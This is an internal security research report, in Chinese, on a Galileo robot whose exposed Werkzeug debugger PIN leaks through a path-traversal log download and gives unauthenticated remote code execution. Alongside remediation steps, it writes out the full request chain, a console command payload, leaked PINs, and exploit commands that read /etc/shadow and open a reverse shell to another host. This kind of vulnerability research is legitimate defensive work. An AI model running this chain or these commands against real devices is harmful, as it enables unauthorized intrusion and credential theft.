---
编号: GAL-010
验证状态: 动态确认
严重程度: 高
披露状态: 内部研究
源平台: 伽利略
源候选目录: Werkzeug调试台PIN泄露RCE-2
---
# GAL-010 伽利略（Galileo）机器人 Werkzeug 调试台 PIN 泄露 → 未授权 RCE 漏洞报告

## 1. 一句话结论

- # 伽利略（Galileo）机器人 Werkzeug 调试台 PIN 泄露 → 未授权 RCE 漏洞报告
- \| 漏洞类型 \| 调试器暴露 + PIN 明文落盘 + 任意文件读取 → 交互式 Python RCE \|
- \| 权限 \| 未授权（同网段）→ 服务用户 galileo 的任意代码执行 \|
- ## 1. 漏洞概述
- 2. 管理器同时存在**未授权任意文件读取**（漏洞 5：`/download_log` 路径穿越），日志目录恰在

## 2. 影响产品与版本

- \| 目标设备 \| 伽利略（Galileo）GRQ05W（固件 galileo-inter 1.0.44，Web 管理器 Flask/Werkzeug 3.1.4） \|
- \| 漏洞组件 \| `galileo_web_manger`（`app.run(debug=True, host='0.0.0.0', port=5000)`） \|
- \| 权限 \| 未授权（同网段）→ 服务用户 galileo 的任意代码执行 \|
- \| 复现日期 \| 2026-08-29（PIN 泄露已从固件日志坐实；console 利用脚本就绪，命令执行待实机） \|
- \| 授权边界 \| 仅对自有设备、隔离环境进行 \|
- Web 管理器以 **debug=True** 在 **0.0.0.0:5000** 运行 Flask 开发服务器，Werkzeug 交互式

## 3. 验证状态

`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- 2. 管理器同时存在**未授权任意文件读取**（漏洞 5：`/download_log` 路径穿越），日志目录恰在
- （PIN 含 boot_id 派生量，随重启轮换——因此必须读**当前**周期的日志，路径穿越读取恰好满足。）

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- # 伽利略（Galileo）机器人 Werkzeug 调试台 PIN 泄露 → 未授权 RCE 漏洞报告
- \| 复现日期 \| 2026-08-29（PIN 泄露已从固件日志坐实；console 利用脚本就绪，命令执行待实机） \|
- ⑤ 以服务用户 galileo 交互式执行任意 Python（等价 RCE；再叠 sudo 免密 → root）
- ## 5. 影响范围
- - debug 模式同时暴露堆栈/源码/环境变量（`/get_functions`、异常页）→ 二次信息泄露。

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# 伽利略（Galileo）机器人 Werkzeug 调试台 PIN 泄露 → 未授权 RCE 漏洞报告

| 项 | 值 |
|---|---|
| 目标设备 | 伽利略（Galileo）GRQ05W（固件 galileo-inter 1.0.44，Web 管理器 Flask/Werkzeug 3.1.4） |
| 漏洞组件 | `galileo_web_manger`（`app.run(debug=True, host='0.0.0.0', port=5000)`） |
| 漏洞类型 | 调试器暴露 + PIN 明文落盘 + 任意文件读取 → 交互式 Python RCE |
| 权限 | 未授权（同网段）→ 服务用户 galileo 的任意代码执行 |
| 复现日期 | 2026-08-29（PIN 泄露已从固件日志坐实；console 利用脚本就绪，命令执行待实机） |
| 授权边界 | 仅对自有设备、隔离环境进行 |

---

## 1. 漏洞概述

Web 管理器以 **debug=True** 在 **0.0.0.0:5000** 运行 Flask 开发服务器，Werkzeug 交互式
调试器（`/console`）随之对外暴露。调试器有 PIN 保护，但：

1. **PIN 被服务明文写进启动日志**：`Debugger PIN: 431-868-632`
   （`galileo_robot_global/logs/robot_startup/web_manager_*.log`）；
2. 管理器同时存在**未授权任意文件读取**（漏洞 5：`/download_log` 路径穿越），日志目录恰在
   可读范围内 → 攻击者无需任何凭据即可**读取当前启动周期的 PIN**；
3. PIN 输入无速率限制，输入正确后 `/console` 提供交互式 Python —— 等价于直接 RCE。

与 /upload（漏洞 1）、connect_wifi 注入（漏洞 4）并列的**第三条未授权 RCE 通道**，且
不依赖上传文件、不产生网络切换副作用——隐蔽性最强。

## 2. 证据

### 2.1 debug 模式 + 全接口绑定（PyInstaller 解包 app.pyc 反汇编）

```
LOAD_CONST '0.0.0.0' / 5000 / True  → app.run(debug=True, host='0.0.0.0', port=5000)
```

### 2.2 PIN 明文（dump 内日志原文）

```
2026-08-28 16:52:35 - * Debugger PIN: 819-846-584
2026-08-29 08:45:12 - * Debugger PIN: 431-868-632
```

（PIN 含 boot_id 派生量，随重启轮换——因此必须读**当前**周期的日志，路径穿越读取恰好满足。）

### 2.3 日志在任意文件读取范围内

- `GET /list_logs_in_dir?dir=robot_startup` → 枚举 `web_manager_YYYYMMDD.log`
- `GET /download_log?dir=robot_startup&file=web_manager_<今日>.log` → 拿到当前 PIN

## 3. 攻击链

```
攻击者（同 WiFi）
   │ ① GET /list_logs_in_dir?dir=robot_startup        （未授权目录列表）
   ▼
② GET /download_log?dir=robot_startup&file=web_manager_<最新>.log
   │   正则抓取 "Debugger PIN: xxx-xxx-xxx"
   ▼
③ GET /console → 取会话密钥 s → POST pinauth(pin)
   ▼
④ GET /console?__debugger__=yes&cmd=__import__('os').popen('id').read()&s=<s>
   ▼
⑤ 以服务用户 galileo 交互式执行任意 Python（等价 RCE；再叠 sudo 免密 → root）
```

## 4. 复现

```bash
python exploit.py 192.168.2.1                    # 自动: 取PIN → 过PIN → 执行 id
python exploit.py 192.168.2.1 -c "cat /etc/shadow"
python exploit.py 192.168.2.1 --revshell 192.168.2.165 4444
```

## 5. 影响范围

- 未授权 RCE（无文件上传痕迹、无网络副作用，取证最难的一条通道）；
- debug 模式同时暴露堆栈/源码/环境变量（`/get_functions`、异常页）→ 二次信息泄露。

## 6. 修复建议

1. 生产关闭 debug（`app.run(debug=False)` 或改用 gunicorn/uwsgi+systemd）；
2. 即便保留调试，日志绝不打印 PIN；Werkzeug 亦支持 `WERKZEUG_DEBUG_PIN=off` 或自定 PIN；
3. `/download_log`/`/list_logs_in_dir` 做 realpath 白名单（同时修漏洞 5）。

## 7. 证据

- `evidence/pin_log_lines.txt`：两条 PIN 日志原文（自 dump 提取）
- `analysis/webmgr_extract/app_dis.txt`：app.pyc 反汇编（debug=True/0.0.0.0:5000）
